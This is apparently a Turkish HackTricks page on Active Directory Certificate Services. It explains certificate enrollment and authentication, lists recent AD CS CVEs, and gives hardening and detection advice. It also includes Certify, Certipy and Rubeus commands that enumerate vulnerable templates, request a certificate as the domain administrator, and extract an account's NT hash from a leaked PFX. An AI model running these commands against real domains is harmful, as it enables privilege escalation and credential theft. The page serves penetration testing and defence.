# AD Certificates

{{#include ../../banners/hacktricks-training.md}}

## Giriş

### Sertifikanın Bileşenleri

- Sertifikanın **Subject** alanı sahibini belirtir.
- **Public Key**, sertifikayı gerçek sahibiyle ilişkilendirmek için özel olarak tutulan bir anahtarla eşleştirilir.
- **NotBefore** ve **NotAfter** tarihleriyle tanımlanan **Validity Period**, sertifikanın geçerli olduğu süreyi belirtir.
- Certificate Authority (CA) tarafından sağlanan benzersiz bir **Serial Number**, her sertifikayı tanımlar.
- **Issuer**, sertifikayı veren CA'yı belirtir.
- **SubjectAlternativeName**, subject için ek adlara izin vererek tanımlama esnekliğini artırır.
- **Basic Constraints**, sertifikanın bir CA'ya mı yoksa son kullanıcıya mı ait olduğunu belirtir ve kullanım kısıtlamalarını tanımlar.
- **Extended Key Usages (EKUs)**, Object Identifier'lar (OID'ler) aracılığıyla kod imzalama veya e-posta şifreleme gibi sertifikanın belirli amaçlarını tanımlar.
- **Signature Algorithm**, sertifikanın imzalanma yöntemini belirtir.
- Issuer'ın özel anahtarıyla oluşturulan **Signature**, sertifikanın doğruluğunu garanti eder.<sup>[[4]](#references)</sup>

### Özel Hususlar

- **Subject Alternative Names (SANs)**, sertifikanın birden fazla kimlik için kullanılabilmesini sağlar ve birden fazla etki alanına sahip sunucular için kritik önem taşır. Saldırganların SAN tanımını manipüle ederek kimliğe bürünme riski oluşturmasını önlemek için güvenli sertifika düzenleme süreçleri hayati önem taşır.<sup>[[4]](#references)</sup>

### Active Directory'deki (AD) Certificate Authority'ler (CA'ler)

AD CS, bir AD forest'ındaki CA sertifikalarını, her biri farklı bir işlev gören belirlenmiş container'lar aracılığıyla tanır:<sup>[[4]](#references)</sup>

- **Certification Authorities** container'ı, güvenilen root CA sertifikalarını içerir.
- **Enrolment Services** container'ı, Enterprise CA'leri ve sertifika şablonlarını listeler.
- **NTAuthCertificates** nesnesi, AD kimlik doğrulaması için yetkilendirilmiş CA sertifikalarını içerir.
- **AIA (Authority Information Access)** container'ı, intermediate ve cross CA sertifikalarıyla sertifika zinciri doğrulamasını kolaylaştırır.

### Sertifika Edinme: İstemci Sertifika İsteği Akışı

1. İstek süreci, istemcilerin bir Enterprise CA bulmasıyla başlar.
2. Public-private key çifti oluşturulduktan sonra, bir public key ve diğer bilgileri içeren CSR oluşturulur.
3. CA, CSR'yi kullanılabilir sertifika şablonlarına göre değerlendirir ve şablon izinlerine bağlı olarak sertifikayı düzenler.
4. Onay verildiğinde CA, sertifikayı özel anahtarıyla imzalar ve istemciye gönderir.<sup>[[4]](#references)</sup>

### Sertifika Şablonları

AD içinde tanımlanan bu şablonlar, sertifika düzenleme ayarlarını ve izinlerini belirler. İzin verilen EKU'lar ile enrollment veya değişiklik haklarını kapsar ve sertifika hizmetlerine erişimi yönetmek açısından kritik öneme sahiptir.<sup>[[4]](#references)</sup>

**Şema sürümü önemlidir.** Eski **v1** şablonlarında (örneğin, yerleşik **WebServer** şablonu) modern zorunlu kılma ayarlarının birçoğu bulunmaz. **ESC15/EKUwu** araştırması, **v1 şablonlarında** istekte bulunan kişinin CSR'ye **Application Policies/EKU'lar** ekleyebildiğini ve bunların şablonda yapılandırılan EKU'lara **tercih edildiğini** ortaya koydu. Böylece yalnızca enrollment hakkıyla client-auth, enrollment agent veya code-signing sertifikaları alınabilir. **v2/v3 şablonlarını** tercih edin, varsayılan v1 şablonlarını kaldırın veya bunların yerine yenilerini kullanın ve EKU'ları amaçlanan kullanımla sınırlandırın.<sup>[[1]](#references)</sup>

## Sertifika Enrollment'ı

Sertifika enrollment sürecini, önce **bir sertifika şablonu oluşturan** bir yönetici başlatır. Ardından şablon bir Enterprise Certificate Authority (CA) tarafından **yayımlanır**. Böylece şablon istemcilerin enrollment işlemi için kullanılabilir hale gelir; bu adım, şablonun adının bir Active Directory nesnesindeki `certificatetemplates` alanına eklenmesiyle gerçekleştirilir.<sup>[[4]](#references)</sup>

Bir istemcinin sertifika isteyebilmesi için **enrollment hakları** verilmelidir. Bu haklar, sertifika şablonu ile Enterprise CA'nın kendisi üzerindeki security descriptor'larda tanımlanır. İsteğin başarılı olması için her iki konumda da izin verilmelidir.<sup>[[4]](#references)</sup>

### Şablon Enrollment Hakları

Bu haklar, aşağıdaki gibi izinleri belirten Access Control Entry'ler (ACE'ler) aracılığıyla tanımlanır:<sup>[[4]](#references)</sup>

- Her biri belirli GUID'lerle ilişkilendirilmiş **Certificate-Enrollment** ve **Certificate-AutoEnrollment** hakları.
- Tüm extended izinlere olanak tanıyan **ExtendedRights**.
- Şablon üzerinde tam denetim sağlayan **FullControl/GenericAll**.

### Enterprise CA Enrollment Hakları

CA'nın hakları, Certificate Authority yönetim konsolundan erişilebilen security descriptor'ında belirtilir. Bazı ayarlar, düşük ayrıcalıklı kullanıcıların uzaktan erişmesine bile izin verebilir; bu bir güvenlik sorunu oluşturabilir.<sup>[[4]](#references)</sup>

### Ek Sertifika Düzenleme Kontrolleri

Şu gibi bazı kontroller uygulanabilir:<sup>[[4]](#references)</sup>

- **Manager Approval**: İstekleri bir sertifika yöneticisi onaylayana kadar beklemede tutar.
- **Enrolment Agents and Authorized Signatures**: CSR için gereken imza sayısını ve gerekli Application Policy OID'lerini belirtir.

### Sertifika İsteme Yöntemleri

Sertifikalar şu yöntemlerle istenebilir:<sup>[[4]](#references)</sup>

1. DCOM arayüzlerini kullanan **Windows Client Certificate Enrollment Protocol** (MS-WCCE).
2. Named pipe'lar veya TCP/IP üzerinden kullanılan **ICertPassage Remote Protocol** (MS-ICPR).
3. Certificate Authority Web Enrollment rolü yüklüyse **sertifika enrollment web arayüzü**.
4. Certificate Enrollment Policy (CEP) hizmetiyle birlikte kullanılan **Certificate Enrollment Service** (CES).
5. Simple Certificate Enrollment Protocol (SCEP) kullanan ağ cihazlarına yönelik **Network Device Enrollment Service** (NDES).

Windows kullanıcıları sertifikaları GUI (`certmgr.msc` veya `certlm.msc`) ya da komut satırı araçları (`certreq.exe` veya PowerShell'ın `Get-Certificate` komutu) aracılığıyla da isteyebilir.

```bash
# Example of requesting a certificate using PowerShell
Get-Certificate -Template "User" -CertStoreLocation "cert:\\CurrentUser\\My"
```

## Sertifika Kimlik Doğrulaması

Active Directory (AD), öncelikli olarak **Kerberos** ve **Secure Channel (Schannel)** protokollerini kullanarak sertifika kimlik doğrulamasını destekler.<sup>[[4]](#references)</sup>

### Kerberos Kimlik Doğrulama Süreci

Kerberos kimlik doğrulama sürecinde, kullanıcının Ticket Granting Ticket (TGT) isteği, kullanıcının sertifikasının **private key**'i kullanılarak imzalanır. Bu istek, etki alanı denetleyicisi tarafından sertifikanın **geçerliliği**, **yolu** ve **iptal durumu** dahil olmak üzere çeşitli doğrulamalardan geçirilir. Doğrulamalar ayrıca sertifikanın güvenilir bir kaynaktan geldiğinin kontrol edilmesini ve verenin **NTAUTH certificate store**'da bulunduğunun doğrulanmasını da içerir. Doğrulamaların başarılı olması, bir TGT verilmesini sağlar. AD'deki **`NTAuthCertificates`** nesnesi şu konumda bulunur:

```bash
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<com>
```

sertifika kimlik doğrulaması için güven tesis etmenin temelidir.<sup>[[4]](#references)</sup>

**KB5014754** dağıtımından bu yana modern Kerberos sertifika kimlik doğrulaması, yalnızca EKU’larla değil, çoğunlukla **eşleme gücüyle** ilgilidir.<sup>[[2]](#references)</sup> Güçlendirilmiş forest’larda:

- Yalnızca **UPN/DNS SAN** içeren bir sertifika artık oturum açmak için yeterli olmayabilir.
- KDC, **SID güvenlik uzantısını** (`1.3.6.1.4.1.311.25.2`) veya `altSecurityIdentities` içinde açıkça tanımlanmış güçlü bir eşlemeyi içeren **güçlü bağlamayı** tercih eder.
- Sertifikada güçlü bir eşleme yoksa DC’ler uyumluluk modunda **Kdcsvc Event ID 39/41** günlüklerini kaydeder, zorunlu uygulama modundaysa kimlik doğrulamayı reddeder.
- Karma saldırı yollarında **ESC9/ESC16** önemlidir; çünkü yayımlanan sertifikalardaki SID uzantısını kaldırırlar. Operatörler daha sonra, saldırı yolunun desteklediği durumlarda açık eşlemelere veya SAN URL SID biçimlerine güvenir.

### Güvenli Kanal (Schannel) Kimlik Doğrulaması

Schannel, el sıkışma sırasında istemcinin bir sertifika sunduğu ve sertifika başarıyla doğrulanırsa erişim izni verilen güvenli TLS/SSL bağlantılarını sağlar.<sup>[[5]](#references)</sup> Bir sertifikanın AD hesabıyla eşlenmesi, diğer yöntemlerin yanı sıra Kerberos’un **S4U2Self** işlevini veya sertifikanın **Subject Alternative Name (SAN)** alanını kullanabilir.<sup>[[4]](#references)</sup>

**PKINIT** kullanılamadığında Schannel aynı zamanda pratik bir alternatiftir. Örneğin, bir domain controller’da uygun bir **Smart Card Logon** sertifikası yoksa `certipy auth`/PKINIT araçları TGT almayı başaramayabilir; ancak aynı sertifika kimlik doğrulama ve LDAP işlemleri için **LDAPS** veya **LDAP StartTLS** üzerinden kullanılabilir.

### AD Certificate Services Keşfi

AD’nin sertifika hizmetleri, **Enterprise Certificate Authority (CA)**’ler ve yapılandırmaları hakkındaki bilgileri açığa çıkaran LDAP sorgularıyla keşfedilebilir. Bu bilgilere, özel ayrıcalıkları olmayan, domain’de kimliği doğrulanmış tüm kullanıcılar erişebilir.<sup>[[4]](#references)</sup> **[Certify](https://github.com/GhostPack/Certify)** ve **[Certipy](https://github.com/ly4k/Certipy)** gibi araçlar, AD CS ortamlarında keşif ve güvenlik açığı değerlendirmesi için kullanılır.<sup>[[6]](#references)</sup>

Bu araçları kullanmaya yönelik komutlar şunlardır:

```bash
# Enumerate trusted root CA certificates, Enterprise CAs, and web endpoints
Certify.exe cas

# Identify vulnerable templates and dump relevant permissions
Certify.exe find /vulnerable
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /showAdmins

# Certipy 5.x enumeration focused on enabled/vulnerable templates
certipy find -enabled -vulnerable -hide-admins -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Save JSON/CSV output for offline review or BloodHound correlation
certipy find -json -output corp_adcs -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Request a certificate over the Web Enrollment endpoint or DCOM/RPC
certipy req -web -ca corp-CA -target ca.corp.local -template WebServer -upn john@corp.local -dns www.corp.local
certipy req -ca corp-CA -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500

# Use the issued certificate either for PKINIT or directly for LDAP Schannel auth
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

### Rubeus ile Certify enumeration bayrakları ve PKINIT

Aşağıdaki Certify komut varyantları, kendilerine özgü filtreleri ve çıktı seçeneklerini korur.<sup>[[6]](#references)</sup>

```bash
# Enumerate trusted root CA certificates, Enterprise CAs and HTTP enrollment endpoints
# Useful flags: /domain, /path, /hideAdmins, /showAllPermissions, /skipWebServiceChecks
Certify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks]

# Identify vulnerable certificate templates and filter for common abuse cases
Certify.exe find
Certify.exe find /vulnerable [/currentuser]
Certify.exe find /enrolleeSuppliesSubject   # ESC1 candidates (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
Certify.exe find /clientauth                # templates with client-auth EKU
Certify.exe find /showAllPermissions        # include template ACLs in output
Certify.exe find /json /outfile:C:\Temp\adcs.json

# Enumerate PKI object ACLs (Enterprise PKI container, templates, OIDs) – useful for ESC4/ESC7 discovery
Certify.exe pkiobjects [/domain:domain.local] [/showAdmins]

# Use Certipy for enumeration and identifying vulnerable templates
certipy find -vulnerable -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

Rubeus, PKINIT kimlik doğrulaması için parola korumalı bir PFX sertifikası da kullanabilir ve bir TGT isteyebilir. İsteğe bağlı `/getcredentials` anahtarı, bir U2U hizmet bileti ister ve hesabın NT hash’ini elde etmeye çalışır:<sup>[[7]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:<USER> /certificate:C:\temp\leaked.pfx /password:<PFX_PASSWORD> /getcredentials /ptt
```

For ESC-specific template ve CA abuse için bkz. [AD CS Domain Escalation](ad-certificates/domain-escalation.md).

---

## Son Güvenlik Açıkları ve Güvenlik Güncellemeleri (2022-2025)

| Yıl | ID / Ad | Etki | Önemli Çıkarımlar |
|------|-----------|--------|----------------|
| 2022 | **CVE-2022-26923** – “Certifried” / ESC6 | PKINIT sırasında machine account sertifikalarını spoof ederek *privilege escalation*. | Yama, **10 Mayıs 2022** güvenlik güncellemelerine dahildir. Denetim ve strong-mapping denetimleri **KB5014754** ile sunuldu; ortamlar artık *Full Enforcement* modunda olmalıdır.  |
| 2023 | **CVE-2023-35350 / 35351** | AD CS Web Enrollment (certsrv) ve CES rollerinde *remote code-execution*. | Herkese açık PoC'ler sınırlıdır, ancak güvenlik açığı bulunan IIS bileşenleri genellikle kurum içinde erişime açıktır. **Temmuz 2023** Patch Tuesday itibarıyla yama uygulayın.  |
| 2024 | **CVE-2024-49019** – “EKUwu” / ESC15 | **v1 templates** üzerinde, enrollment haklarına sahip bir requester CSR içine template EKU'larından öncelikli **Application Policies/EKUs** ekleyerek client-auth, enrollment agent veya code-signing sertifikaları oluşturabilir. | **12 Kasım 2024** itibarıyla yama uygulanmıştır. v1 templates'i (örn. varsayılan WebServer) değiştirin veya yerlerine yenilerini kullanın, EKU'ları amaca göre kısıtlayın ve enrollment haklarını sınırlandırın. |

### Microsoft hardening zaman çizelgesi (KB5014754)

Microsoft, Kerberos sertifika kimlik doğrulamasını zayıf örtük eşlemelerden uzaklaştırmak için üç aşamalı bir geçiş (Compatibility → Audit → Enforcement) başlattı. **11 Şubat 2025** itibarıyla, `StrongCertificateBindingEnforcement` registry değeri ayarlanmamışsa domain controller'lar otomatik olarak **Full Enforcement** moduna geçer. Microsoft daha sonra zaman çizelgesini güncelleyerek **9 Eylül 2025** güvenlik güncellemesine kadar compatibility moduna dönüşün mümkün kalmasını sağladı.<sup>[[2]](#references)</sup> Yöneticiler:

1. Tüm DC'lere ve AD CS sunucularına yama uygulamalıdır (Mayıs 2022 veya sonrası).
2. *Audit* aşamasında zayıf eşlemeler için Event ID 39/41'i izlemelidir.
3. Enforcement zayıf eşlemeleri engellemeden önce, client-auth sertifikalarını yeni **SID extension** ile yeniden vermeli veya güçlü manuel eşlemeler yapılandırmalıdır.

### Hardening uygulanmış forest'lar için operator notları

- **ESC1/ESC6 tek başına artık 2025 ve sonrası ortamlar için yeterli değildir.** Başka bir principal adına sertifika istediğinizde genellikle SID extension veya açık bir eşleme gibi güçlü bir mapping artifact da gerekir.
- **ESC15 (EKUwu)** çoğunlukla yamalanmamış ortamlarda işe yarar; **Application Policies** enjekte ederek **WebServer** gibi zararsız **v1** templates'i kimlik doğrulama veya enrollment agent işlevi gören sertifikalara dönüştürür. Kerberos PKINIT, EKU'ları değerlendirmeye devam eder; ancak **LDAP Schannel** da Application Policies'i dikkate alır, bu da LDAP tabanlı abuse'u geçerli kılar.<sup>[[1]](#references)</sup>
- **ESC16** CA genelinde geçerli bir ayardır: CA, SID security extension'ı genel olarak devre dışı bırakırsa saldırı zinciri desteklenen başka bir formatla SID enjekte etmediği sürece verilen tüm sertifikalar daha zayıf mapping davranışına döner.
- **ESC7 hakları birbirinden farklıdır:** Bir CA `ManageCA` izni, `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6) gibi ayarlarda değişiklik yapılmasına izin verebilir; `ManageCertificates` ise istek onayını yönetir. Certificate-manager haklarında açık bir Deny, Allow izni de bulunsa onay yolunu engelleyebilir; ayarları ve templates'i zincirlemeden önce etkin CA ACL'ini değerlendirin. Bkz. [Microsoft'un CA ACL değerlendirmesi](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting).

---

## Tespit ve Hardening İyileştirmeleri

* **Defender for Identity AD CS sensor (2023-2024)** artık ESC1-ESC8/ESC11 için posture assessment'lar sunar ve *“Domain-controller certificate issuance for a non-DC”* (ESC8) ile *“Prevent Certificate Enrollment with arbitrary Application Policies”* (ESC15) gibi gerçek zamanlı uyarılar oluşturur. Bu tespitlerden yararlanmak için tüm AD CS sunucularına sensor'lar kurun.<sup>[[3]](#references)</sup>
* Tüm templates üzerinde **“Supply in the request”** seçeneğini devre dışı bırakın veya kapsamını sıkı biçimde sınırlayın; açıkça tanımlanmış SAN/EKU değerlerini tercih edin.
* Kesinlikle gerekli olmadıkça templates'ten **Any Purpose** veya **No EKU** değerlerini kaldırın (ESC2 senaryolarını ele alır).
* Hassas templates için (örn. WebServer / CodeSigning) **manager approval** veya özel Enrollment Agent iş akışları gerektirin.
* Web enrollment (`certsrv`) ve CES/NDES uç noktalarına erişimi güvenilir ağlarla veya client-certificate authentication arkasında sınırlandırın.
* ESC11'i (RPC relay) azaltmak için RPC enrollment encryption'ı zorunlu kılın (`certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST`). Bu flag **varsayılan olarak açıktır**, ancak eski istemciler için sıkça devre dışı bırakılır ve relay riski yeniden ortaya çıkar.
* **IIS tabanlı enrollment uç noktalarını** (CES/Certsrv) güvenli hale getirin: mümkünse NTLM'i devre dışı bırakın veya ESC8 relay'lerini engellemek için HTTPS + Extended Protection gerektirin.

ESC11'i CA'nın çalıştığı host üzerinde değerlendirin; bu host bir domain controller yerine domain üyesi sunucu olabilir. Etkin CA'nın `InterfaceFlags` değerini `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration` altında okuyun; okunamayan veya eksik bir değer, RPC encryption'ın devre dışı olduğunun kanıtı değil, bilinmeyen bir sonuçtur. `IF_ENFORCEENCRYPTICERTREQUEST` bitinin kapalı olması, yine de erişilebilir bir enrollment RPC endpoint'i, kimlik bilgileri elde etmeye zorlanabilir bir hesap ve kullanılabilir bir certificate template gerektiren bir yapılandırma ipucudur. ESC8 için yalnızca bir HTTP NTLM challenge olması yeterli değildir: çalışan bir enrollment endpoint'i bulunduğunu doğrulayın.

---

## References

- [1] [EKUwu: Sıradan bir AD CS ESC'den fazlası](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [2] [KB5014754: Windows domain controller'larda sertifika tabanlı kimlik doğrulama değişiklikleri](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [3] [Sertifika güvenlik duruşu değerlendirmeleri - Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates)
- [4] [Certified Pre-Owned: Active Directory Certificate Services abuse](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [5] [SSL/TLS Client Authentication nedir ve nasıl çalışır?](https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html)
- [6] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [7] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
{{#include ../../banners/hacktricks-training.md}}
